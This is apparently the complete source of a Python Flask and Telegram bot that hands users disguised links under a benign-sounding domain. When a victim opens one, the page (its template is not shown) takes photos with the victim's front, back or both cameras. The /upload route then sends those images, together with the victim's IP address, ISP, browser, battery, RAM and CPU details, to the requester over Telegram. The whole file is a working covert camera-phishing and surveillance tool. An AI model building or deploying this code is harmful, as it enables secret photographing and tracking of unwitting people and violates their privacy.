import os, base64, threading, sqlite3, time, telebot, requests, signal
from flask import Flask, render_template, request, jsonify
from telebot import types

def kill_old_processes():
    try:
        current_pid = os.getpid()
        os.system(f"pgrep -f app.py | grep -v {current_pid} | xargs kill -9")
    except: pass

kill_old_processes()

app = Flask(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMINS = [518067190, 7162565886]
TG_CHANNEL = "hackerscolonytech"
YT_LINK = "https://youtube.com/@hackers_colony_tech"
RENDER_LINK = "https://happy-wishing-you.onrender.com"

bot = telebot.TeleBot(BOT_TOKEN)

def db_init():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, photo_count INTEGER DEFAULT 0)')
    cursor.execute('CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, total_photos INTEGER DEFAULT 0)')
    cursor.execute('INSERT OR IGNORE INTO stats (id, total_photos) VALUES (1, 0)')
    conn.commit(); conn.close()

db_init()

def is_user_joined(user_id):
    try:
        member = bot.get_chat_member(f"@{TG_CHANNEL}", user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def start(message):
    conn = sqlite3.connect('users.db'); cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO users (id) VALUES (?)', (message.chat.id,))
    conn.commit(); conn.close()
    
    if is_user_joined(message.chat.id):
        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"), 
                   types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"))
        markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
        markup.add(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
        bot.send_message(message.chat.id, "<b>Select your camera mode:</b>", parse_mode='HTML', reply_markup=markup)
    else:
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("📢 Join Telegram 📢", url=f"https://t.me/{TG_CHANNEL}"),
                   types.InlineKeyboardButton("📺 Subscribe YouTube 📺", url=YT_LINK),
                   types.InlineKeyboardButton("✅ I Have Joined & Subscribed ✅", callback_data="check_join"))
        bot.send_message(message.chat.id, "<b>Access Denied! Join Channel First.</b>", parse_mode='HTML', reply_markup=markup)

@bot.message_handler(commands=['stats'])
def total_stats(message):
    if message.from_user.id in ADMINS:
        conn = sqlite3.connect('users.db'); cursor = conn.cursor()
        cursor.execute('SELECT total_photos FROM stats WHERE id = 1')
        total = cursor.fetchone()[0]
        bot.reply_to(message, f"📊 <b>Total Photos Received:</b> {total}", parse_mode='HTML')

@bot.message_handler(commands=['users'])
def user_list(message):
    if message.from_user.id in ADMINS:
        conn = sqlite3.connect('users.db'); cursor = conn.cursor()
        cursor.execute('SELECT id, photo_count FROM users')
        rows = cursor.fetchall()
        response = "👥 <b>User Activity List:</b>\n\n"
        for row in rows:
            response += f"👤 ID: <code>{row[0]}</code> | 📸 Photos: {row[1]}\n"
        bot.reply_to(message, response, parse_mode='HTML')

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id in ADMINS:
        text = message.text.replace('/broadcast', '').strip()
        if not text:
            bot.reply_to(message, "Usage: /broadcast [message]")
            return
        conn = sqlite3.connect('users.db'); cursor = conn.cursor()
        cursor.execute('SELECT id FROM users'); users = cursor.fetchall(); conn.close()
        count = 0
        for user in users:
            try: bot.send_message(user[0], text); count += 1
            except: pass
        bot.send_message(message.chat.id, f"✅ Sent to {count} users.")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data.startswith("m_"):
        mode = call.data.split("_")[1]
        final_url = f"{RENDER_LINK}/?m={mode}&uid={call.message.chat.id}"
        msg = f"🤠 <b>Your Link:</b>\n\n<a href='{final_url}'>{final_url}</a>\n\n✨ Team HCO ✨"
        bot.send_message(call.message.chat.id, msg, parse_mode='HTML', disable_web_page_preview=True)

@app.route('/')
def index(): return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    uid = data.get('uid'); info = data.get('info', {})
    try: isp = requests.get(f"http://ip-api.com/json/{request.remote_addr}").json().get('isp', 'Unknown')
    except: isp = "Unknown"
    
    img_data = base64.b64decode(data.get('image').split(',')[1])
    caption = (f"🛡️ <b>Audit:</b> {data.get('mode', 'N/A').upper()}\n"
               f"🔋 <b>Battery:</b> {info.get('battery')}\n"
               f"🌐 <b>Browser:</b> {info.get('browser')}\n"
               f"🧠 <b>RAM:</b> {info.get('ram')}\n"
               f"⚙️ <b>CPU:</b> {info.get('cores')} Cores\n"
               f"📶 <b>Network:</b> {isp}\n"
               f"📍 <b>IP:</b> {request.remote_addr}\n\n"
               f"✨ Created by Roshan ✨")
    
    conn = sqlite3.connect('users.db'); cursor = conn.cursor()
    cursor.execute('UPDATE stats SET total_photos = total_photos + 1 WHERE id = 1')
    cursor.execute('UPDATE users SET photo_count = photo_count + 1 WHERE id = ?', (uid,))
    conn.commit(); conn.close()
    
    bot.send_photo(uid, img_data, caption=caption, parse_mode='HTML')
    return jsonify({"status": "success"})

if __name__ == "__main__":
    threading.Thread(target=lambda: bot.polling(none_stop=True), daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
        
